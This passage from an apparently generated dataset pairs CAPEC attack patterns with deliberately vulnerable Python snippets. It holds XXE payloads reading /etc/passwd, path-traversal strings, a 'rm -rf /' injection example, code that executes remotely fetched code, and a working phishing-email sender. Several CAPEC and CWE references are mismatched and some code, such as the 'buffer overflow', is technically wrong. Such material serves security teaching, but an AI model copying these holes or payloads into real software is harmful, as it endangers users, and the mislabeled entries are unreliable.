        "description": "This Python code snippet demonstrates a vulnerability where a user-controlled environment variable ('DEBUG') is directly used to control a critical configuration setting (debug mode) without any sanitization or validation. This embodies the main idea of the CAPEC 'Manipulating User-Controlled Variables' and is related to CWE-15 (External Control of System or Configuration Setting) and CWE-302 (Authentication Bypass by Assumed-Immutable Data). An attacker could manipulate the 'DEBUG' environment variable to enable debug mode, potentially exposing sensitive information or altering the application's behavior."
    },
    {
        "capec_id": "78",
        "capec_name": "Using Escaped Slashes in Alternate Encoding",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    # Validate input before canonicalization (CWE-180)\n    if not file_path.startswith('/safe/directory/'):\n        raise ValueError('Invalid file path')\n    \n    # Canonicalize the path\n    canonical_path = os.path.realpath(file_path)\n    \n    # Validate the canonicalized path\n    if not canonical_path.startswith('/safe/directory/'):\n        raise ValueError('Invalid file path after canonicalization')\n    \n    # Read the file\n    with open(canonical_path, 'r') as file:\n        return file.read()\n\n# Example usage\nuser_input = '../etc/passwd'  # Potentially malicious input\ntry:\n    content = read_file(user_input)\n    print(content)\nexcept ValueError as e:\n    print(e)",
        "description": "This Python code snippet demonstrates a vulnerability related to the CAPEC 'Using Escaped Slashes in Alternate Encoding' and several related CWEs. The function `read_file` is intended to read a file from a specified path. It first attempts to validate the input path before canonicalizing it (CWE-180). This can lead to security issues because the validation is done on the non-canonical path, which can be manipulated using techniques like path traversal (CWE-22). After canonicalizing the path using `os.path.realpath`, it re-validates the path to ensure it is within the intended directory. However, if the initial validation is bypassed using alternate encoding or escape sequences, it can lead to improper handling of file paths (CWE-73, CWE-74). The code highlights the importance of proper input validation and canonicalization to prevent security vulnerabilities."
    },
    {
        "capec_id": "79",
        "capec_name": "Using Slashes in Alternate Encoding",
        "code_snippet": "import os\n\n# Function to read a file based on user input\n# CWE-73: External Control of File Name or Path\n# CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\ndef read_file(user_input):\n    # CWE-20: Improper Input Validation\n    if not isinstance(user_input, str):\n        raise ValueError('Invalid input type')\n\n    # CWE-180: Incorrect Behavior Order: Validate Before Canonicalize\n    # CWE-181: Incorrect Behavior Order: Validate Before Filter\n    # CWE-173: Improper Handling of Alternate Encoding\n    # Attempt to normalize the path\n    normalized_path = os.path.normpath(user_input)\n\n    # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n    # CWE-707: Improper Neutralization\n    if '..' in normalized_path or '\\' in normalized_path or '/' in normalized_path:\n        raise ValueError('Invalid path')\n\n    # Attempt to open the file\n    try:\n        with open(normalized_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found'\n    except Exception as e:\n        return str(e)\n\n# Example usage\nuser_input = '../etc/passwd'  # This should raise an error due to path traversal attempt\nprint(read_file(user_input))",
        "description": "This Python code snippet demonstrates a vulnerable file reading function that embodies the main idea of CAPEC-147: Using Slashes in Alternate Encoding. The function `read_file` takes user input to determine the file path to read. It attempts to normalize the path using `os.path.normpath`, but it fails to properly handle alternate encodings and special characters, leading to potential path traversal vulnerabilities (CWE-22, CWE-73). The code also demonstrates improper input validation (CWE-20), incorrect behavior order (CWE-180, CWE-181), and improper neutralization of special elements (CWE-74, CWE-707). The example usage shows how an attacker might exploit this vulnerability by providing a path traversal string."
    },
    {
        "capec_id": "80",
        "capec_name": "Using UTF-8 Encoding to Bypass Validation Logic",
        "code_snippet": "import re\n\ndef is_valid_input(user_input):\n    # Validate input using a regex pattern\n    pattern = re.compile(r'^[a-zA-Z0-9]+$')\n    if pattern.match(user_input):\n        return True\n    return False\n\n# Example of a naive decoder that accepts overlong UTF-8 sequences\ndef naive_utf8_decoder(input_bytes):\n    try:\n        return input_bytes.decode('utf-8')\n    except UnicodeDecodeError:\n        return None\n\n# User input that is overlong UTF-8 encoded\nuser_input = b'\\xc0\\xaf'  # Overlong encoding for '/'\n\n# Validate the input before decoding\nif is_valid_input(user_input.decode('utf-8', 'ignore')):\n    decoded_input = naive_utf8_decoder(user_input)\n    if decoded_input:\n        print(f'Valid input: {decoded_input}')\n    else:\n        print('Invalid UTF-8 sequence')\nelse:\n    print('Invalid input format')",
        "description": "This Python code snippet demonstrates a vulnerability where UTF-8 encoding is used to bypass validation logic. The `is_valid_input` function validates user input using a regex pattern that only allows alphanumeric characters. However, the input is validated before it is properly decoded, which can lead to incorrect validation results. The `naive_utf8_decoder` function is an example of a decoder that accepts overlong UTF-8 sequences, which can be exploited. The user input `b'\\xc0\\xaf'` is an overlong encoding for the '/' character, which can bypass the initial validation and be incorrectly processed by the decoder. This snippet highlights the importance of proper input validation and decoding order to prevent security vulnerabilities."
    },
    {
        "capec_id": "81",
        "capec_name": "Web Server Logs Tampering",
        "code_snippet": "import logging\n\n# Setup logging\nlogging.basicConfig(filename='webserver.log', level=logging.INFO)\n\n# Function to log user input\ndef log_user_action(user_input):\n    logging.info(f'User action: {user_input}')\n\n# Simulated user input\nuser_input = \"User logged in\\nDELETE FROM users WHERE '1'='1' --\"\n\n# Log the user input\nlog_user_action(user_input)\n",
        "description": "This Python code snippet demonstrates a vulnerable logging mechanism that can be exploited for Web Server Logs Tampering. The `log_user_action` function logs user input directly to a log file without proper sanitization or neutralization of special characters. The simulated user input contains a newline character and an SQL injection payload, which can disrupt the log file's structure and potentially execute malicious commands. This example highlights the importance of proper input validation and neutralization to prevent log tampering and injection attacks."
    },
    {
        "capec_id": "82",
        "capec_name": "DEPRECATED: Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML data (potentially from an untrusted source)\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<root>\n  <data>&xxe;</data>\n</root>\n'''\n\ntry:\n    # Parse the XML data without proper validation\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(root.find('data').text)\nexcept ET.ParseError as e:\n    print(f\"XML parsing error: {e}\")",
        "description": "This Python code snippet demonstrates a vulnerability related to improper restriction of XML External Entity (XXE) references (CWE-611). The XML data includes an external entity definition that attempts to access the '/etc/passwd' file on the system. The code parses the XML data without validating it against a schema or disabling external entity processing, which can lead to sensitive data exposure or other security issues. This example embodies the main idea of the deprecated CAPEC, which involves XML content that can lead to denial of service or other security vulnerabilities when implicit assumptions about the XML content are violated."
    },
    {
        "capec_id": "83",
        "capec_name": "XPath Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Sample XML data\nxml_data = '''\n<users>\n    <user>\n        <username>admin</username>\n        <password>admin123</password>\n    </user>\n    <user>\n        <username>user</username>\n        <password>user123</password>\n    </user>\n</users>\n'''\n\n# Parse the XML data\nroot = ET.fromstring(xml_data)\n\n# User input (potentially malicious)\nuser_input = \"' or '1'='1\"\n\n# Constructing an XPath expression using unsanitized user input\nxpath_expr = f\".//user[username/text()='{user_input}']/password/text()\"\n\n# Executing the XPath query\npasswords = root.findall(xpath_expr)\n\n# Output the results\nfor password in passwords:\n    print(password.text)",
        "description": "This Python code snippet demonstrates an XPath Injection vulnerability. It parses a sample XML data structure containing user credentials and constructs an XPath expression using unsanitized user input. The user input is directly embedded into the XPath query without any validation or sanitization, allowing an attacker to manipulate the query. In this example, the input \"' or '1'='1\" is used to bypass authentication checks, potentially retrieving all passwords in the XML data. This code embodies the main idea of CAPEC-91 (XPath Injection) and highlights related weaknesses such as improper input validation (CWE-20) and improper neutralization of data within XPath expressions (CWE-643)."
    },
    {
        "capec_id": "84",
        "capec_name": "XQuery Injection",
        "code_snippet": "import lxml.etree as ET\n\n# User input that is not properly sanitized\nuser_input = \"' or '1'='1\"\n\n# Constructing an XQuery expression using unsanitized user input\nxquery = f\"/users/user[username='{user_input}']/data\"\n\n# Loading an example XML document\nxml_data = '''\n<users>\n    <user>\n        <username>admin</username>\n        <data>Admin Data</data>\n    </user>\n    <user>\n        <username>guest</username>\n        <data>Guest Data</data>\n    </user>\n</users>\n'''\n\ndoc = ET.fromstring(xml_data)\n\n# Executing the XQuery expression\nresult = doc.xpath(xquery)\n\n# Output the result\nprint(result)\n",
        "description": "This Python code snippet demonstrates an XQuery Injection vulnerability. The code constructs an XQuery expression using unsanitized user input, which can be manipulated by an attacker to alter the query's structure. In this example, the user input is designed to always return true (' or '1'='1'), potentially exposing all user data. The code loads an XML document and executes the constructed XQuery expression, illustrating how improper neutralization of input can lead to security vulnerabilities. This example embodies the main idea of CAPEC-74 and related CWEs, highlighting the risks of injection attacks in XML databases."
    },
    {
        "capec_id": "85",
        "capec_name": "AJAX Footprinting",
        "code_snippet": "import requests\nfrom flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query')\n    if not query:\n        return jsonify({'error': 'No query provided'}), 400\n    # CWE-20: Improper Input Validation\n    if '<script>' in query:\n        return jsonify({'error': 'Invalid input'}), 400\n    # CWE-116: Improper Encoding or Escaping of Output\n    response = f\"<div>Search results for: {query}</div>\"\n    return response\n\n@app.route('/ajax', methods=['POST'])\ndef ajax():\n    data = request.json\n    if not data or 'url' not in data:\n        return jsonify({'error': 'Invalid data'}), 400\n    # CWE-348: Use of Less Trusted Source\n    url = data['url']\n    try:\n        # CWE-79: Cross-site Scripting (XSS)\n        external_response = requests.get(url)\n        return jsonify({'content': external_response.text})\n    except requests.RequestException as e:\n        return jsonify({'error': str(e)}), 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application with two endpoints: '/search' and '/ajax'. The '/search' endpoint takes a query parameter and returns a search result. It includes basic input validation to prevent XSS attacks (CWE-20) and attempts to escape output (CWE-116), but it is not comprehensive. The '/ajax' endpoint accepts a JSON payload with a URL, fetches content from the URL, and returns it. This endpoint demonstrates the use of a less trusted source (CWE-348) and is vulnerable to XSS (CWE-79) if the fetched content is not properly sanitized. The code embodies the main idea of AJAX Footprinting by showing how frequent client-server interactions can be exploited to gather information and identify vulnerabilities."
    },
    {
        "capec_id": "86",
        "capec_name": "XSS Through HTTP Headers",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    user_agent = request.headers.get('User-Agent')\n    response = make_response(f'<html><body><h1>Welcome!</h1><p>Your user agent is: {user_agent}</p></body></html>')\n    return response\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that reads the 'User-Agent' HTTP header from incoming requests and includes it in the HTML response without proper validation or sanitization. This embodies the main idea of the CAPEC 'XSS Through HTTP Headers' by demonstrating how an attacker could exploit the lack of input neutralization to inject malicious scripts via HTTP headers. The related CWEs highlight the importance of properly neutralizing input to prevent XSS attacks, which this code fails to do, making it vulnerable."
    },
    {
        "capec_id": "87",
        "capec_name": "Forceful Browsing",
        "code_snippet": "from flask import Flask, request, redirect, url_for\n\napp = Flask(__name__)\n\n# Simulated user roles\nuser_roles = {\n    'user1': 'admin',\n    'user2': 'user'\n}\n\n# Simulated session\nsession = {\n    'username': 'user2'\n}\n\n@app.route('/admin')\ndef admin_panel():\n    # Improper Authorization: No check if the user is an admin\n    if session['username'] in user_roles:\n        return 'Welcome to the admin panel, {}'.format(session['username'])\n    else:\n        return redirect(url_for('login'))\n\n@app.route('/login')\ndef login():\n    return 'Please log in'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to demonstrate a vulnerability related to 'Forceful Browsing' (CAPEC-111). The code defines an '/admin' route that should be restricted to admin users only. However, it fails to properly enforce authorization checks (CWE-285), allowing any logged-in user to access the admin panel. This represents a 'Direct Request' vulnerability (CWE-425). The session dictionary simulates a logged-in user with a non-admin role, but the code does not verify the user's role before granting access to the admin panel. This lack of proper authorization checks can lead to unauthorized access to sensitive parts of the web application."
    },
    {
        "capec_id": "88",
        "capec_name": "OS Command Injection",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # Vulnerable to OS Command Injection\n    command = f'ls {user_input}'\n    os.system(command)\n\nuser_input = input('Enter directory name: ')\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates a basic example of OS Command Injection vulnerability. The function `execute_command` takes user input and constructs an OS command string without proper validation or neutralization of special elements. The `os.system` function then executes this command. An attacker can exploit this by providing malicious input, such as `; rm -rf /`, to execute arbitrary commands on the underlying operating system. This example embodies the main idea of CAPEC-88 and related CWEs, particularly CWE-78 (Improper Neutralization of Special Elements used in an OS Command) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "89",
        "capec_name": "Pharming",
        "code_snippet": "import socket\nimport requests\n\n# CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\ndef get_hostname(ip_address):\n    try:\n        return socket.gethostbyaddr(ip_address)[0]\n    except socket.herror:\n        return None\n\n# CWE-346: Origin Validation Error\ndef is_trusted_host(hostname):\n    trusted_hosts = ['trustedbank.com', 'trustedtrading.com']\n    return hostname in trusted_hosts\n\n# CWE-494: Download of Code Without Integrity Check\ndef download_code(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)\n    else:\n        print('Failed to download code')\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\ndef client_side_security_check(url):\n    if 'https' not in url:\n        print('Insecure connection!')\n    else:\n        print('Secure connection')\n\n# CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\ndef generate_web_page(user_input):\n    return f'<html><body>{user_input}</body></html>'\n\n# Simulating a pharming attack\nip_address = '192.168.1.100'\nhostname = get_hostname(ip_address)\nif hostname and is_trusted_host(hostname):\n    url = f'http://{hostname}/malicious_code'\n    client_side_security_check(url)\n    download_code(url)\n    user_input = '<script>alert(\"Pharming Attack!\")</script>'\n    web_page = generate_web_page(user_input)\n    print(web_page)\nelse:\n    print('Untrusted host')",
        "description": "This Python code snippet simulates a pharming attack by demonstrating several related CWEs. It first resolves an IP address to a hostname (CWE-350) and checks if the hostname is trusted (CWE-346). If trusted, it attempts to download and execute code from a URL without verifying its integrity (CWE-494). It also performs a client-side security check on the URL (CWE-602) and generates a web page with user input that could lead to cross-site scripting (CWE-79). The code represents the main idea of a pharming attack by showing how an attacker can redirect a victim to a malicious site and execute harmful actions."
    },
    {
        "capec_id": "90",
        "capec_name": "Reflection Attack in Authentication Protocol",
        "code_snippet": "import socket\n\n# Simple challenge-response authentication protocol\nclass AuthServer:\n    def __init__(self, secret_key):\n        self.secret_key = secret_key\n\n    def generate_challenge(self):\n        return 'challenge'\n\n    def verify_response(self, response):\n        return response == self.secret_key\n\nclass AuthClient:\n    def __init__(self, secret_key):\n        self.secret_key = secret_key\n\n    def respond_to_challenge(self, challenge):\n        return self.secret_key\n\n# Simulating a reflection attack\nserver = AuthServer('secret')\nclient = AuthClient('secret')\n\n# Attacker intercepts the challenge\nchallenge = server.generate_challenge()\n\n# Attacker reflects the challenge back to the server\nresponse = client.respond_to_challenge(challenge)\n\n# Server incorrectly verifies the response\nif server.verify_response(response):\n    print('Authentication successful (vulnerable to reflection attack)')\nelse:\n    print('Authentication failed')",
        "description": "This Python code snippet demonstrates a simple challenge-response authentication protocol that is vulnerable to a reflection attack. The `AuthServer` class generates a challenge and verifies the response, while the `AuthClient` class responds to the challenge using a shared secret key. An attacker can intercept the challenge and reflect it back to the server, which incorrectly verifies the response, leading to successful authentication without possessing the requisite credentials. This example embodies the main idea of CAPEC-301 (Reflection Attack in Authentication Protocol) and highlights the potential weaknesses described in the related CWEs, such as incorrect implementation of the authentication algorithm (CWE-303) and authentication bypass by spoofing (CWE-290)."
    },
    {
        "capec_id": "91",
        "capec_name": "DEPRECATED: XSS in IMG Tags",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/display', methods=['GET'])\ndef display():\n    user_input = request.args.get('input', '')\n    # Vulnerable to XSS in IMG tags\n    html_content = f'<img src=\"{user_input}\" />'\n    return render_template_string(html_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic Flask web application that is vulnerable to Cross-Site Scripting (XSS) attacks through the improper neutralization of script in attributes of IMG tags (CWE-82). The application takes user input from a query parameter 'input' and directly inserts it into the 'src' attribute of an IMG tag without proper sanitization or validation. This allows an attacker to inject malicious scripts, leading to XSS attacks. The code also highlights the risk of using incomplete denylist-based protection mechanisms (CWE-692) and improper neutralization of script-related HTML tags (CWE-80)."
    },
    {
        "capec_id": "92",
        "capec_name": "Forced Integer Overflow",
        "code_snippet": "import sys\n\n# Function to simulate forced integer overflow\n\ndef allocate_memory(size):\n    # CWE-190: Integer Overflow or Wraparound\n    if size > sys.maxsize:\n        size = size - sys.maxsize - 1\n    \n    # CWE-680: Integer Overflow to Buffer Overflow\n    try:\n        buffer = [0] * size\n    except MemoryError:\n        print(\"Memory allocation failed!\")\n        return None\n    \n    return buffer\n\n# Simulate user-controlled input\nuser_input = sys.maxsize + 1\n\n# CWE-128: Wrap-around Error\nbuffer = allocate_memory(user_input)\n\nif buffer is not None:\n    print(\"Buffer allocated with size:\", len(buffer))\nelse:\n    print(\"Failed to allocate buffer.\")",
        "description": "This Python code snippet demonstrates a forced integer overflow vulnerability. The `allocate_memory` function takes a size parameter and attempts to allocate a buffer of that size. If the size exceeds the maximum value for an integer (`sys.maxsize`), it wraps around to a smaller value, simulating CWE-190 (Integer Overflow or Wraparound) and CWE-128 (Wrap-around Error). This can lead to CWE-680 (Integer Overflow to Buffer Overflow) when the buffer allocation does not account for the overflow, potentially causing a buffer overflow. The code also handles a `MemoryError` to simulate a failed memory allocation scenario."
    },
    {
        "capec_id": "93",
        "capec_name": "Log Injection-Tampering-Forging",
        "code_snippet": "import logging\n\n# Setup logging\nlogging.basicConfig(filename='app.log', level=logging.INFO)\n\n# Function to log user input\ndef log_user_action(user_input):\n    logging.info(f'User action: {user_input}')\n\n# Simulate user input\nuser_input = \"User logged in; DROP TABLE users; --\"\nlog_user_action(user_input)\n",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Log Injection-Tampering-Forging' (CAPEC). The code sets up a basic logging mechanism and includes a function to log user actions. The user input is not sanitized or neutralized, allowing an attacker to inject malicious content into the log file. This can mislead log audits, cover traces of attacks, or perform other malicious actions. The code embodies CWE-117 (Improper Output Neutralization for Logs) by failing to neutralize special characters in the user input, CWE-75 (Failure to Sanitize Special Elements) by not filtering user-controlled input, and CWE-150 (Improper Neutralization of Escape, Meta, or Control Sequences) by not handling special sequences properly. Additionally, it touches on CWE-532 (Insertion of Sensitive Information into Log File) and CWE-779 (Logging of Excessive Data) by potentially logging sensitive or excessive information."
    },
    {
        "capec_id": "94",
        "capec_name": "Adversary in the Middle (AiTM)",
        "code_snippet": "import socket\nimport ssl\n\n# Create a context with improper SSL settings\ncontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\ncontext.check_hostname = False\ncontext.verify_mode = ssl.CERT_NONE\n\n# Connect to a server without proper verification\nwith socket.create_connection(('example.com', 443)) as sock:\n    with context.wrap_socket(sock, server_hostname='example.com') as ssock:\n        ssock.sendall(b'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n')\n        print(ssock.recv(1024).decode())",
        "description": "This Python code snippet demonstrates a vulnerable SSL/TLS connection setup, embodying the 'Adversary in the Middle (AiTM)' attack. The code creates an SSL context with improper settings: it disables hostname verification and certificate validation (CWE-300: Channel Accessible by Non-Endpoint). This allows an attacker to intercept and potentially alter the communication between the client and the server. The code connects to a server ('example.com') without verifying the server's identity, making it susceptible to man-in-the-middle attacks. This example highlights the importance of proper SSL/TLS configuration to prevent such vulnerabilities."
    },
    {
        "capec_id": "95",
        "capec_name": "WSDL Scanning",
        "code_snippet": "import requests\n\n# URL of the WSDL file\nwsdl_url = 'http://example.com/service?wsdl'\n\n# Fetch the WSDL file\nresponse = requests.get(wsdl_url)\n\n# Check if the WSDL file is accessible\nif response.status_code == 200:\n    wsdl_content = response.text\n    print('WSDL file content:')\n    print(wsdl_content)\n\n    # Example of scanning for sensitive information\n    if 'password' in wsdl_content or 'secret' in wsdl_content:\n        print('Sensitive information found in WSDL file!')\nelse:\n    print('Failed to access WSDL file')",
        "description": "This Python code snippet demonstrates a basic WSDL scanning attack. It fetches the WSDL file from a specified URL and checks if it is accessible. If the WSDL file is accessible, it prints the content of the file. The code then scans the WSDL content for sensitive information such as 'password' or 'secret'. This embodies the main idea of CAPEC-111 (WSDL Scanning) by showing how an attacker might access and analyze a WSDL file to find sensitive information, which could lead to further attacks. The code also highlights CWE-651 (Exposure of WSDL File Containing Sensitive Information) by demonstrating the potential exposure of sensitive data within the WSDL file."
    },
    {
        "capec_id": "96",
        "capec_name": "Block Access to Libraries",
        "code_snippet": "import os\n\n# Attempt to use a third-party library\ntry:\n    import some_third_party_lib\nexcept ImportError:\n    print(\"Error: Required library 'some_third_party_lib' is not available.\")\n    # Fallback to a non-ubiquitous API function\n    try:\n        os.some_non_ubiquitous_function()\n    except AttributeError:\n        print(\"Error: Fallback function is not available on this platform.\")\n        # Improper error handling leading to potential insecure state\n        exit(1)\n\n# Use of prohibited code\ntry:\n    import prohibited_lib\nexcept ImportError:\n    print(\"Error: Prohibited library 'prohibited_lib' is not available.\")\n    exit(1)\n\n# Use of blocking code in a single-threaded, non-blocking context\nimport time\n\ndef blocking_function():\n    time.sleep(10)  # This is a blocking call\n\nblocking_function()\n\n# Inclusion of functionality from an untrusted control sphere\ntry:\n    exec(open('/path/to/untrusted/script.py').read())\nexcept FileNotFoundError:\n    print(\"Error: Untrusted script not found.\")\n    exit(1)",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Block Access to Libraries' and the associated CWEs. The code attempts to import a third-party library and handles the ImportError by falling back to a non-ubiquitous API function, which may not exist on all platforms, leading to an AttributeError. The error handling is improper, potentially leaving the system in an insecure state. The code also attempts to import a prohibited library, which is explicitly disallowed. Additionally, it includes a blocking function in a single-threaded context, which can cause scalability issues. Finally, the code attempts to execute a script from an untrusted source, which can introduce security risks. This snippet highlights the importance of proper error handling, avoiding prohibited code, and ensuring that all included functionalities are from trusted sources."
    },
    {
        "capec_id": "97",
        "capec_name": "Cryptanalysis",
        "code_snippet": "import os\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad, unpad\n\n# Use of a weak key (CWE-327)\nkey = b'weakkey12345678'  # 128-bit key\n\n# Use of a predictable IV (CWE-1204)\niv = b'0000000000000000'  # 16 bytes IV\n\ncipher = AES.new(key, AES.MODE_CBC, iv)\n\n# Encrypting data\nplaintext = b'This is a secret message'\nciphertext = cipher.encrypt(pad(plaintext, AES.block_size))\nprint(f'Ciphertext: {ciphertext.hex()}')\n\n# Decrypting data\ncipher = AES.new(key, AES.MODE_CBC, iv)\ndecrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)\nprint(f'Decrypted: {decrypted.decode()}')",
        "description": "This Python code snippet demonstrates a cryptographic operation using the AES algorithm in CBC mode. It embodies the main idea of CAPEC-189 (Cryptanalysis) by showcasing vulnerabilities that can be exploited through cryptanalysis. The code uses a weak key (CWE-327) and a predictable IV (CWE-1204), making it susceptible to attacks. An attacker could potentially exploit these weaknesses to decipher the ciphertext without knowing the secret key. The code highlights the importance of using strong, unpredictable keys and IVs to ensure cryptographic security."
    },
    {
        "capec_id": "98",
        "capec_name": "Phishing",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# CWE-601: URL Redirection to Untrusted Site\nphishing_url = 'http://malicious-site.com/login'\n\n# CWE-451: UI Misrepresentation of Critical Information\nemail_body = f\"\"\"\nDear User,\n\nWe have detected unusual activity on your account. Please click the link below to verify your identity:\n\n<a href='{phishing_url}'>Verify Now</a>\n\nThank you,\nYour Trusted Service\n\"\"\"\n\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n# CWE-512: Spyware\n# Sending the phishing email\nmsg = MIMEText(email_body, 'html')\nmsg['Subject'] = 'Important: Verify Your Account'\nmsg['From'] = 'no-reply@trustedservice.com'\nmsg['To'] = 'victim@example.com'\n\ntry:\n    with smtplib.SMTP('smtp.example.com') as server:\n        server.sendmail(msg['From'], [msg['To']], msg.as_string())\n    print('Phishing email sent successfully.')\nexcept Exception as e:\n    print(f'Failed to send email: {e}')",
        "description": "This Python code snippet demonstrates a phishing attack by sending a deceptive email to a victim. The email contains a link to a malicious site (CWE-601: URL Redirection to Untrusted Site) and misrepresents critical information (CWE-451: UI Misrepresentation of Critical Information) to trick the user into clicking the link. The email is crafted to appear as if it is from a trusted service, which is a common tactic in phishing attacks. The code uses the smtplib library to send the email, embedding malicious intent within seemingly benign functionality (CWE-506: Embedded Malicious Code, CWE-507: Trojan Horse). The goal is to collect sensitive information from the user without their explicit consent (CWE-512: Spyware)."
    },
    {
        "capec_id": "99",
        "capec_name": "DEPRECATED: XML Parser Attack",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML data (could be from an untrusted source)\nxml_data = '''\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>\n'''\n\ntry:\n    # Parsing the XML data without proper validation\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(ET.tostring(root, encoding='unicode'))\nexcept ET.ParseError as e:\n    print(f\"XML parsing error: {e}\")",
        "description": "This Python code snippet demonstrates a vulnerability related to CAPEC-230 and CAPEC-231, specifically focusing on CWE-611 (Improper Restriction of XML External Entity Reference). The code parses an XML document that includes an external entity reference. The XML data contains a DOCTYPE declaration that defines an external entity 'xxe' which references the local file '/etc/passwd'. When the XML is parsed without proper validation, it can lead to an XML External Entity (XXE) attack, potentially exposing sensitive files. This example highlights the importance of validating and sanitizing XML inputs to prevent such vulnerabilities."
    },
    {
        "capec_id": "100",
        "capec_name": "Overflow Buffers",
        "code_snippet": "import struct\n\ndef vulnerable_function(data):\n    buffer = bytearray(10)  # Fixed-size buffer\n    for i in range(len(data)):\n        buffer[i] = data[i]  # No bounds checking\n\n# Example usage\nuser_input = b'A' * 20  # Input larger than buffer size\nvulnerable_function(user_input)",
        "description": "This Python code snippet demonstrates a classic buffer overflow vulnerability. The function `vulnerable_function` takes an input `data` and attempts to copy it into a fixed-size buffer of 10 bytes. However, there is no bounds checking to ensure that the input data fits within the buffer. If the input data exceeds the buffer size, it will write past the buffer's boundaries, leading to a buffer overflow. This example embodies the main idea of the CAPEC 'Overflow Buffers' and is related to CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer). The provided user input `b'A' * 20` is larger than the buffer size, which will trigger the overflow."
    },
    {
        "capec_id": "101",
        "capec_name": "Server Side Include (SSI) Injection",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/vulnerable', methods=['GET', 'POST'])\ndef vulnerable():\n    if request.method == 'POST':\n        user_input = request.form['user_input']\n        # Directly embedding user input into the template without sanitization\n        response = render_template_string(f\"<html><body>{user_input}</body></html>\")\n        return response\n    return '''<form method=\"post\">\n                  Input: <input type=\"text\" name=\"user_input\">\n                  <input type=\"submit\">\n              </form>'''\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable Flask web application endpoint that is susceptible to Server Side Include (SSI) Injection. The '/vulnerable' route accepts user input via a POST request and directly embeds this input into an HTML template using `render_template_string` without any sanitization or validation. This lack of input neutralization (CWE-97) and improper input validation (CWE-20) allows an attacker to inject SSI directives or other malicious content. The code also exemplifies CWE-74 by not neutralizing special elements in the user input, which could be interpreted as commands by the server. The form provided in the GET request allows users to submit potentially harmful input, demonstrating the risk of SSI Injection."
    },
    {
        "capec_id": "102",
        "capec_name": "Session Sidejacking",
        "code_snippet": "import http.client\n\n# Establish an unencrypted HTTP connection\nconn = http.client.HTTPConnection('example.com')\n\n# Send a login request with credentials in cleartext\nconn.request('POST', '/login', 'username=admin&password=admin123')\n\n# Get the response which includes a session token in cleartext\nresponse = conn.getresponse()\nset_cookie_header = response.getheader('Set-Cookie')\nsession_token = set_cookie_header.split(';')[0]\n\nprint(f'Session token: {session_token}')\n\n# Use the session token to perform an authenticated action\nheaders = {'Cookie': session_token}\nconn.request('GET', '/sensitive_action', headers=headers)\nresponse = conn.getresponse()\nprint(response.read().decode())",
        "description": "This Python code snippet demonstrates a vulnerable implementation of a login system that transmits credentials and session tokens in cleartext over an unencrypted HTTP connection. The code first establishes an HTTP connection to 'example.com' and sends a POST request with the username and password in cleartext. It then retrieves the session token from the response header and uses it to perform an authenticated action. This code embodies the main idea of CAPEC-Session Sidejacking by showing how an attacker could sniff the network traffic to capture the session token and impersonate the victim. The related CWEs are represented by the cleartext transmission of sensitive information (CWE-319), insufficiently protected credentials (CWE-522), and unprotected transport of credentials (CWE-523)."
    },
    {
        "capec_id": "103",
        "capec_name": "Clickjacking",
        "code_snippet": "from flask import Flask, render_template_string, request\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return render_template_string('''\n    <html>\n    <head>\n        <title>Clickjacking Example</title>\n    </head>\n    <body>\n        <h1>Welcome to the vulnerable site</h1>\n        <iframe src=\"http://malicious-site.com\" width=\"500\" height=\"500\"></iframe>\n    </body>\n    </html>\n    ''')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
